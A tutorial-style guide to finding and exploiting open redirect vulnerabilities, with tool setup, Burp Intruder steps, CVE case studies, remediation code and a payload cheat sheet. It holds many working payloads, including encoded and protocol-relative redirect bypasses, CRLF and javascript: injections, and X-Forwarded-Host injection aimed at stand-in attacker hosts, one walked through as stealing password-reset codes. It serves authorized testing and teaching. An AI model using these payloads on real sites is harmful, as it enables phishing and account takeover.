# Complete Methodology for Open Redirect Testing and Exploitation

## Table of Contents

1. Understanding Open Redirect Vulnerabilities
2. Prerequisites and Setup
3. Manual Testing Methodology
4. Automated Tools and Techniques
5. Using Burp Suite for Open Redirect Discovery
6. Advanced Bypass Techniques
7. Real-World Exploit Examples (2025-2026)
8. Testing Checklist
9. Reporting and Remediation


## 1. Understanding Open Redirect Vulnerabilities

An open redirect vulnerability occurs when a web application accepts user-controlled input that specifies a URL to which users will be redirected without proper validation . Attackers can craft malicious URLs that redirect victims to phishing sites while appearing to come from a trusted source.

**Types of Open Redirects:**

- **Server-Side Redirects**: Using HTTP 3xx responses with Location headers
- **DOM-Based Redirects**: Client-side JavaScript manipulating `window.location` or `document.location` 
- **Meta Refresh Redirects**: Using `<meta http-equiv="refresh">` tags
- **Header-Based Redirects**: Through `X-Forwarded-Host` or similar headers 


## 2. Prerequisites and Setup

### Tools to Install

```bash
# OpenRedireX - Automated open redirect scanner
git clone https://github.com/devanshbatham/OpenRedireX
cd OpenRedireX
pip install -r requirements.txt

# Oralyzer - Advanced analyzer with DOM XSS and CRLF detection
git clone https://github.com/0xNanda/Oralyzer
cd Oralyzer
pip install -r requirements.txt

# Orion Open Redirect Hunter - Safe automation scanner
git clone https://github.com/shubhu3dev/orion-open-redirect-hunter
cd orion-open-redirect-hunter
pip install requests
```

### Burp Suite Setup

1. Configure Burp Suite proxy on `127.0.0.1:8080`
2. Install CA certificate in your browser
3. Ensure Burp Suite Professional license for Intruder feature 
4. Enable logging of all requests/responses


## 3. Manual Testing Methodology

### Step 1: Identify Redirect Parameters

Common parameter names to test :

```bash
redirect, redirect_to, redirect_url, redir, redirect_uri
return, return_to, return_url, returnTo, return_path
next, goto, forward, continue, checkout_url
url, uri, link, site, file_url, image_url
dest, destination, target, to, out
callback, backto, backurl, view, go
```

**Real-World Example:** In Pachno 1.0.6, the `return_to` parameter was found vulnerable to open redirect, allowing attackers to redirect users to arbitrary external websites after login .

### Step 2: Test Basic Redirects

Construct test URLs using safe destinations (use `example.com` or `google.com` for testing) :

```bash
# Basic test
https://target.com/login?redirect=https://google.com
https://target.com/login?url=https://google.com
https://target.com/login?next=https://google.com

# After accessing, check if you land on google.com
```

### Step 3: Test Protocol-Relative URLs

Many developers incorrectly validate absolute URLs but miss protocol-relative ones :

```bash
# Protocol-relative bypass
https://target.com/login?redirect=//google.com
https://target.com/login?url=//evil.com
https://target.com/login?next=//attacker.com
```

**Real-World Example:** Miniflux version 2.2.14 had an open redirect vulnerability where `redirect_url=//ikotaslabs.com` passed validation because `url.Parse(...).IsAbs()` returned false for protocol-relative URLs. The browser then resolved this to `https://ikotaslabs.com` after login .

### Step 4: Test Encoding Bypasses

```bash
# Double URL encoding
https://target.com/login?redirect=%252f%252fgoogle.com

# Unicode characters
https://target.com/login?redirect=google。com

# Null byte injection
https://target.com/login?redirect=google%00.com

# Whitespace bypass
https://target.com/login?redirect=%09/google.com
https://target.com/login?redirect=%20/google.com

# Backslash encoding
https://target.com/login?redirect=%5cgoogle.com
```

### Step 5: Test Path Traversal in Redirects

```bash
# Path traversal techniques
https://target.com/login?redirect=//www.google.com/%2f%2e%2e
https://target.com/login?redirect=//www.google.com/%2e%2e
https://target.com/login?redirect=//google.com/%2f..
https://target.com/login?redirect=/\victim.com:80%40google.com
```

### Step 6: Test for Header-Based Redirects

Some applications trust `X-Forwarded-Host` or `Forwarded` headers without validation :

```bash
# Manipulate headers
GET /password-reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Forwarded: host=evil.com
```

**Real-World Example:** ZITADEL versions 4.0.0-rc.1 through 4.7.0 had an open redirect vulnerability in the password reset mechanism. The application used `X-Forwarded-Host` header to construct password reset confirmation links without validation, allowing attackers to redirect reset tokens to malicious domains .

### Step 7: Test DOM-Based Redirects

Look for client-side JavaScript that uses user input for redirection :

```javascript
// Search for these patterns in JavaScript
window.location = params.url
document.location = params.redirect
location.href = params.returnTo
window.location.replace(params.next)
```

**Testing DOM redirects:**
```bash
# Inject JavaScript-breaking payloads
https://target.com/page?redirect=javascript:alert('XSS')
https://target.com/page?url=data:text/html,<script>alert(1)</script>

# Test for improper validation
https://target.com/page?next=https://google.com%0a%0dLocation:%20evil.com
```


## 4. Automated Tools and Techniques

### Using OpenRedireX

```bash
# Basic scan with custom payloads
python3 openredirex.py -u "https://target.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

# Multiple URLs from file
cat urls.txt | while read url; do
    python3 openredirex.py -u "$url" -p payloads.txt --keyword FUZZ
done
```

### Using Oralyzer

```bash
# Single URL test
python3 oralyzer.py -u https://target.com/redir?url=

# With custom headers
python3 oralyzer.py -u https://target.com/redirect?to= -H "User-Agent: Mozilla/5.0"
```

### Using Orion Open Redirect Hunter (Safe Scanner)

This tool is designed for safe, authorized testing :

```bash
# Single URL with auto-detected parameters
python orion_open_redirect_hunter.py --url "https://target.com/login?next=/dashboard"

# Force specific parameters
python orion_open_redirect_hunter.py --url "https://target.com/oauth/authorize" --params "redirect_uri,returnTo"

# Multiple URLs from file
python orion_open_redirect_hunter.py --url-file urls.txt

# With HEAD requests and delay
python orion_open_redirect_hunter.py --url "https://target.com/auth?redirect_uri=/home" --method HEAD --delay 0.25 --timeout 5
```

### Python Script for Manual Testing

```python
import requests
from urllib.parse import urlencode

base_url = "https://target.com/login"
redirect_params = ["redirect", "url", "next", "return", "continue", "dest", "destination"]
test_url = "https://google.com"

for param in redirect_params:
    params = {param: test_url}
    test_url_full = f"{base_url}?{urlencode(params)}"
    
    try:
        response = requests.get(test_url_full, allow_redirects=True, timeout=10)
        
        if response.url.startswith(test_url):
            print(f"[!] VULNERABLE: Parameter '{param}' allows external redirect")
            print(f"    URL: {test_url_full}")
            print(f"    Redirected to: {response.url}")
    except Exception as e:
        print(f"[-] Error testing {param}: {e}")
```


## 5. Using Burp Suite for Open Redirect Discovery

### Step-by-Step Burp Methodology

**Step 1: Spider the Target**
1. Navigate to Target > Site Map
2. Right-click on target domain > Spider this host
3. Allow spidering to complete

**Step 2: Identify Potential Parameters**
1. Go to Target > Site Map
2. Filter for parameters containing redirect keywords
3. Look for `=http` or `=aHR0c` (base64 of "http")

**Step 3: Configure Intruder for Parameter Fuzzing**

1. Send a request with a redirect parameter to Burp Repeater
2. Right-click > Send to Intruder (Ctrl+I)
3. In Positions tab, highlight the parameter value and click "Add §"

Example request:
```
GET /login?redirect=§https://google.com§ HTTP/1.1
Host: target.com
```

**Step 4: Set Up Payloads**

1. Go to Payloads tab
2. Payload type: Simple list
3. Add these payloads :
```
https://google.com
//google.com
///google.com
/\google.com
\/google.com
https:@google.com
%2f%2fgoogle.com
%5cgoogle.com
/%09/google.com
//google%E3%80%82com
//google%00.com
```

**Step 5: Configure Attack Settings**

1. In Options tab, under Redirections:
   - Select "Follow redirections"
   - Choose "Always" or "On-site only"
2. Under Grep - Match:
   - Add "Location:" to monitor redirect headers
   - Add "google.com" to detect successful redirects

**Step 6: Launch Attack**

1. Click "Start Attack"
2. Analyze results for:
   - Status codes 301, 302, 303, 307, 308
   - Location headers pointing to external domains
   - Response bodies containing redirect JavaScript

**Step 7: Test DOM-Based Redirects with Burp **

1. Use Burp Scanner's passive scan for DOM issues
2. Check JavaScript files for:
   ```javascript
   window.location = params.url
   document.location = params.redirect
   location.href = params.returnTo
   ```

3. Use Repeater to test DOM parameters:
   ```
   GET /page?redirect=javascript:alert('XSS') HTTP/1.1
   GET /page?url=data:text/html,<script>alert(1)</script>
   ```


## 6. Advanced Bypass Techniques

### Parameter Pollution

When applications validate the first occurrence but use the last:

```bash
https://target.com/login?redirect=/safe&redirect=https://evil.com
```

### CRLF Injection for Open Redirect

```bash
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Using @ Symbol

```bash
# Browser ignores everything before @
https://target.com/login?redirect=https://evil.com@google.com
```

### Combining Multiple Techniques

```bash
# Multiple slashes + encoding
https://target.com///google.com/%2f%2e%2e

# Fragment-based bypass (server ignores fragment)
https://target.com/redirect?url=/safe#https://evil.com
```

**Real-World Example:** Onlook web application 0.2.32 had an open redirect vulnerability where the OAuth callback handler trusted `X-Forwarded-Host` header without validation. Attackers could manipulate this header to redirect authenticated users to arbitrary external websites .


## 7. Real-World Exploit Examples (2025-2026)

### Example 1: Miniflux Protocol-Relative Redirect (CVE-2025-67713)

**Vulnerability:** Open redirect via protocol-relative URLs 

**Root Cause:** The `url.Parse(...).IsAbs()` function returned false for `//domain.com` URLs, bypassing validation. Browsers then resolved these to absolute URLs.

**Exploit:**
```http
GET /login?redirect_url=//ikotaslabs.com HTTP/1.1
Host: miniflux.example.com
```

**Impact:** After completing normal login, users were redirected to the attacker-controlled domain `https://ikotaslabs.com`, enabling phishing attacks.

**Fix:** Version 2.2.15 added proper validation for protocol-relative URLs.

### Example 2: ZITADEL Host Header Injection (CVE-2026-29067)

**Vulnerability:** Open redirect in password reset mechanism 

**Root Cause:** The login V2 component used `X-Forwarded-Host` header to construct password reset confirmation URLs without validation.

**Exploit Steps:**
1. Attacker sends password reset request with malicious header:
   ```http
   POST /password-reset HTTP/1.1
   Host: zitadel.example.com
   X-Forwarded-Host: attacker.com
   
   email=victim@example.com
   ```

2. ZITADEL generates reset link: `https://attacker.com/reset?code=SECRET_CODE`
3. Victim receives email with poisoned link
4. Victim clicks link, revealing secret code to attacker
5. Attacker uses code to reset victim's password

**Impact:** Full account takeover of any ZITADEL user who initiates password reset.

**Affected Versions:** 4.0.0-rc.1 through 4.7.0

**Fix:** Version 4.7.1 added validation of headers against trusted domain allowlists.

### Example 3: Onlook OAuth Callback Redirect (CVE-2025-63784)

**Vulnerability:** Open redirect in OAuth callback handler 

**Root Cause:** The application trusted `X-Forwarded-Host` header when constructing redirect URLs.

**Exploit:**
```http
GET /auth/callback HTTP/1.1
Host: onlook.example.com
X-Forwarded-Host: evil.com
```

**Impact:** Authenticated users redirected to attacker-controlled sites, enabling phishing.

**CVSS Score:** 6.5 (Medium)

**Affected Version:** Onlook 0.2.32

### Example 4: Pachno return_to Parameter (CVE-2026-40039)

**Vulnerability:** Open redirect via `return_to` parameter 

**Root Cause:** The `return_to` parameter was not validated before redirecting users after login.

**Exploit:**
```http
GET /login?return_to=https://evil.com HTTP/1.1
Host: pachno.example.com
```

**Impact:** Attackers could craft malicious login URLs to steal credentials via phishing.

**Affected Version:** Pachno 1.0.6


## 8. Testing Checklist

### Pre-Testing Preparation

- [ ] Obtain written authorization to test
- [ ] Set up testing environment (Burp Suite, tools)
- [ ] Identify target scope and boundaries
- [ ] Use safe test domains (example.com, google.com)

### Manual Testing

- [ ] Identify all redirect parameters in the application
- [ ] Test basic redirects to external domains
- [ ] Test protocol-relative URLs (//evil.com)
- [ ] Test encoded payloads (URL encoding, double encoding)
- [ ] Test path traversal techniques
- [ ] Test using @ symbol bypass
- [ ] Test with whitespace and tab characters
- [ ] Test with null bytes
- [ ] Test with Unicode lookalike characters
- [ ] Test header injection (X-Forwarded-Host, Forwarded)
- [ ] Test DOM-based JavaScript redirects
- [ ] Test meta refresh tags

### Automated Testing

- [ ] Run OpenRedireX with custom payload list
- [ ] Run Oralyzer for comprehensive analysis
- [ ] Run Orion Open Redirect Hunter for safe scanning
- [ ] Configure Burp Intruder with redirect payloads
- [ ] Analyze Burp results for Location headers

### Verification

- [ ] Confirm redirect actually reaches external domain
- [ ] Check for filtering bypass opportunities
- [ ] Test if redirect works after authentication
- [ ] Document exact payload and response
- [ ] Capture screenshots of successful redirect


## 9. Reporting and Remediation

### How to Report

When reporting an open redirect vulnerability, include:

1. **Vulnerable endpoint:** Full URL with parameter
2. **Proof of concept:** Working exploit URL
3. **Impact assessment:** Phishing, credential theft, session hijacking potential
4. **Step-by-step reproduction:** Clear instructions
5. **Screenshots:** Showing successful redirect to external domain

### Remediation Recommendations

For developers to fix open redirects :

**1. Allowlist Approach (Most Secure):**
```javascript
const allowedDomains = ['example.com', 'trusted-site.net'];
const redirectUrl = new URL(urlParam);
if (allowedDomains.includes(redirectUrl.hostname)) {
    window.location.href = redirectUrl;
}
```

**2. Server-Side Validation:**
```python
from urllib.parse import urlparse

def is_safe_redirect(url):
    parsed = urlparse(url)
    allowed_hosts = ['example.com', 'api.example.com']
    return parsed.hostname in allowed_hosts and parsed.scheme in ['http', 'https']
```

**3. Content Security Policy:**
```
Content-Security-Policy: default-src 'self'; navigate-to 'self'
```

**4. Additional Mitigations:**
- Never trust user input for redirect destinations
- Use server-side redirects instead of client-side when possible
- Implement proper validation of `X-Forwarded-Host` and `Forwarded` headers 
- Display warning pages before redirecting to external domains
- Use relative paths instead of absolute URLs


## Quick Reference: Payload Cheatsheet

```bash
# Basic external redirect
https://target.com/redirect?url=https://evil.com

# Protocol-relative
https://target.com/redirect?url=//evil.com

# Double slash variants
https://target.com/redirect?url=///evil.com
https://target.com/redirect?url=/\/evil.com

# Encoded variants
https://target.com/redirect?url=%2f%2fevil.com
https://target.com/redirect?url=%5cevil.com

# Whitespace bypass
https://target.com/redirect?url=%09/evil.com

# @ symbol bypass
https://target.com/redirect?url=https://evil.com@google.com

# Path traversal
https://target.com/redirect?url=//evil.com/%2f%2e%2e

# Header injection
X-Forwarded-Host: evil.com
Forwarded: host=evil.com
```
